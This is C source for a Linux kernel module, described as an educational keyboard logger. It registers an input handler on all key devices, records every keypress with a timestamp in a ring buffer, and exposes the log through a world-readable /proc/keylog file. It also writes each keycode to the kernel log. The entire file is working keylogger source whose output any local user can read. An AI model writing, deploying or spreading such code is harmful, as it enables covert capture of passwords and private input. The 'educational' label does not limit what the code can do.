#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/time.h>
#include <linux/version.h>
#include <linux/uaccess.h>
#include <linux/seq_file.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Student");
MODULE_DESCRIPTION("Educational keyboard logger for Linux input subsystem study");
MODULE_VERSION("1.2");

#define BUFFER_SIZE 2048
#define MAX_LINE_LEN 64
#define MAX_LINES 32  // 32 строк * 64 байт = 2048 байт

struct log_line {
    char data[MAX_LINE_LEN];
    int len;
};

struct keylog_buffer {
    struct log_line lines[MAX_LINES];
    int head;
    int tail;
    int count;
    int overflow_count;
    spinlock_t lock;
};

static struct keylog_buffer *klog_buf = NULL;
static struct proc_dir_entry *proc_entry = NULL;

static const char *keycode_to_char(int code) {
    switch(code) {
        case KEY_ESC: return "[ESC]";
        case KEY_1: return "1"; case KEY_2: return "2"; case KEY_3: return "3";
        case KEY_4: return "4"; case KEY_5: return "5"; case KEY_6: return "6";
        case KEY_7: return "7"; case KEY_8: return "8"; case KEY_9: return "9";
        case KEY_0: return "0";
        case KEY_MINUS: return "-"; case KEY_EQUAL: return "=";
        case KEY_BACKSPACE: return "[BS]";
        case KEY_TAB: return "[TAB]";
        case KEY_Q: return "Q"; case KEY_W: return "W"; case KEY_E: return "E";
        case KEY_R: return "R"; case KEY_T: return "T"; case KEY_Y: return "Y";
        case KEY_U: return "U"; case KEY_I: return "I"; case KEY_O: return "O";
        case KEY_P: return "P";
        case KEY_LEFTBRACE: return "["; case KEY_RIGHTBRACE: return "]";
        case KEY_ENTER: return "[ENTER]\n";
        case KEY_LEFTCTRL: return "[CTRL]";
        case KEY_A: return "A"; case KEY_S: return "S"; case KEY_D: return "D";
        case KEY_F: return "F"; case KEY_G: return "G"; case KEY_H: return "H";
        case KEY_J: return "J"; case KEY_K: return "K"; case KEY_L: return "L";
        case KEY_SEMICOLON: return ";"; case KEY_APOSTROPHE: return "'";
        case KEY_GRAVE: return "`";
        case KEY_LEFTSHIFT: return "[SHIFT]";
        case KEY_BACKSLASH: return "\\";
        case KEY_Z: return "Z"; case KEY_X: return "X"; case KEY_C: return "C";
        case KEY_V: return "V"; case KEY_B: return "B"; case KEY_N: return "N";
        case KEY_M: return "M";
        case KEY_COMMA: return ","; case KEY_DOT: return "."; case KEY_SLASH: return "/";
        case KEY_RIGHTSHIFT: return "[SHIFT]";
        case KEY_KPASTERISK: return "*";
        case KEY_LEFTALT: return "[ALT]";
        case KEY_SPACE: return " ";
        case KEY_CAPSLOCK: return "[CAPS]";
        case KEY_F1: return "[F1]"; case KEY_F2: return "[F2]"; case KEY_F3: return "[F3]";
        case KEY_F4: return "[F4]"; case KEY_F5: return "[F5]"; case KEY_F6: return "[F6]";
        case KEY_F7: return "[F7]"; case KEY_F8: return "[F8]"; case KEY_F9: return "[F9]";
        case KEY_F10: return "[F10]"; case KEY_F11: return "[F11]"; case KEY_F12: return "[F12]";
        case KEY_HOME: return "[HOME]"; case KEY_END: return "[END]";
        case KEY_INSERT: return "[INS]"; case KEY_DELETE: return "[DEL]";
        case KEY_PAGEUP: return "[PGUP]"; case KEY_PAGEDOWN: return "[PGDN]";
        case KEY_UP: return "[UP]"; case KEY_DOWN: return "[DOWN]";
        case KEY_LEFT: return "[LEFT]"; case KEY_RIGHT: return "[RIGHT]";
        default: return NULL;
    }
}

static void add_to_buffer(const char *key_str) {
    unsigned long flags;
    int len;
    
    if (!klog_buf || !key_str)
        return;
    
    len = strlen(key_str);
    if (len >= MAX_LINE_LEN - 1)  // -1 для '\n'
        len = MAX_LINE_LEN - 2;
    
    spin_lock_irqsave(&klog_buf->lock, flags);
    
    // Если буфер полон, удаляем самую старую строку
    if (klog_buf->count >= MAX_LINES) {
        klog_buf->head = (klog_buf->head + 1) % MAX_LINES;
        klog_buf->count--;
        klog_buf->overflow_count++;
    }
    
    // Добавляем новую строку
    if (len > 0) {
        memcpy(klog_buf->lines[klog_buf->tail].data, key_str, len);
        klog_buf->lines[klog_buf->tail].data[len] = '\n';
        klog_buf->lines[klog_buf->tail].len = len + 1;
        klog_buf->tail = (klog_buf->tail + 1) % MAX_LINES;
        klog_buf->count++;
    }
    
    spin_unlock_irqrestore(&klog_buf->lock, flags);
}

static void keylogger_event(struct input_handle *handle, unsigned int type,
                           unsigned int code, int value) {
    const char *key_str;
    char log_entry[MAX_LINE_LEN];
    struct timespec64 ts;
    int len;
    
    if (type != EV_KEY || value != 1)  // Только нажатия
        return;
    
    key_str = keycode_to_char(code);
    if (!key_str)
        return;
    
    ktime_get_real_ts64(&ts);
    
    // Формируем строку: [секунды] ключ
    len = snprintf(log_entry, sizeof(log_entry), "[%lld] %s", 
                   (long long)ts.tv_sec, key_str);
    
    if (len > 0 && len < sizeof(log_entry)) {
        add_to_buffer(log_entry);
        printk(KERN_DEBUG "keylogger: Key %d -> %s\n", code, key_str);
    }
}

static int keylogger_connect(struct input_handler *handler,
                            struct input_dev *dev,
                            const struct input_device_id *id) {
    struct input_handle *handle;
    int error;
    
    handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
    if (!handle)
        return -ENOMEM;
    
    handle->dev = dev;
    handle->handler = handler;
    handle->name = "keylogger";
    
    error = input_register_handle(handle);
    if (error) {
        kfree(handle);
        return error;
    }
    
    error = input_open_device(handle);
    if (error) {
        input_unregister_handle(handle);
        kfree(handle);
        return error;
    }
    
    return 0;
}

static void keylogger_disconnect(struct input_handle *handle) {
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
}

static const struct input_device_id keylogger_ids[] = {
    {
        .flags = INPUT_DEVICE_ID_MATCH_EVBIT,
        .evbit = { BIT_MASK(EV_KEY) },
    },
    { }
};

static struct input_handler keylogger_handler = {
    .event      = keylogger_event,
    .connect    = keylogger_connect,
    .disconnect = keylogger_disconnect,
    .name       = "keylogger",
    .id_table   = keylogger_ids,
};

static int keylog_proc_show(struct seq_file *m, void *v) {
    unsigned long flags;
    int i, pos;
    
    if (!klog_buf) {
        seq_puts(m, "Buffer not initialized\n");
        return 0;
    }
    
    spin_lock_irqsave(&klog_buf->lock, flags);
    
    seq_printf(m, "=== Keylogger Buffer ===\n");
    seq_printf(m, "Size: %d lines (%d bytes)\n", klog_buf->count, 
               klog_buf->count * MAX_LINE_LEN);
    seq_printf(m, "Overflows: %d\n", klog_buf->overflow_count);
    seq_puts(m, "========================\n\n");
    
    if (klog_buf->count == 0) {
        seq_puts(m, "No keys logged yet.\n");
    } else {
        for (i = 0, pos = klog_buf->head; i < klog_buf->count; i++) {
            seq_write(m, klog_buf->lines[pos].data, klog_buf->lines[pos].len);
            pos = (pos + 1) % MAX_LINES;
        }
    }
    
    spin_unlock_irqrestore(&klog_buf->lock, flags);
    return 0;
}

static int keylog_proc_open(struct inode *inode, struct file *file) {
    return single_open(file, keylog_proc_show, NULL);
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
static const struct proc_ops keylog_proc_ops = {
    .proc_open = keylog_proc_open,
    .proc_read = seq_read,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};
#else
static const struct file_operations keylog_proc_ops = {
    .owner = THIS_MODULE,
    .open = keylog_proc_open,
    .read = seq_read,
    .llseek = seq_lseek,
    .release = single_release,
};
#endif

static int __init keylogger_init(void) {
    int ret;
    
    printk(KERN_INFO "keylogger: Initializing...\n");
    
    klog_buf = kzalloc(sizeof(struct keylog_buffer), GFP_KERNEL);
    if (!klog_buf) {
        printk(KERN_ERR "keylogger: Failed to allocate buffer\n");
        return -ENOMEM;
    }
    
    spin_lock_init(&klog_buf->lock);
    klog_buf->head = 0;
    klog_buf->tail = 0;
    klog_buf->count = 0;
    klog_buf->overflow_count = 0;
    
    proc_entry = proc_create("keylog", 0444, NULL, &keylog_proc_ops);
    if (!proc_entry) {
        printk(KERN_ERR "keylogger: Failed to create /proc/keylog\n");
        kfree(klog_buf);
        return -ENOMEM;
    }
    
    ret = input_register_handler(&keylogger_handler);
    if (ret) {
        printk(KERN_ERR "keylogger: Failed to register input handler: %d\n", ret);
        proc_remove(proc_entry);
        kfree(klog_buf);
        return ret;
    }
    
    printk(KERN_INFO "keylogger: Module loaded successfully\n");
    printk(KERN_INFO "keylogger: Buffer size: %d bytes\n", MAX_LINES * MAX_LINE_LEN);
    printk(KERN_INFO "keylogger: Read with: cat /proc/keylog\n");
    printk(KERN_WARNING "keylogger: FOR EDUCATIONAL USE ONLY!\n");
    
    return 0;
}

static void __exit keylogger_exit(void) {
    printk(KERN_INFO "keylogger: Unloading module...\n");
    
    input_unregister_handler(&keylogger_handler);
    
    if (proc_entry) {
        proc_remove(proc_entry);
        proc_entry = NULL;
    }
    
    if (klog_buf) {
        kfree(klog_buf);
        klog_buf = NULL;
    }
    
    printk(KERN_INFO "keylogger: Module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
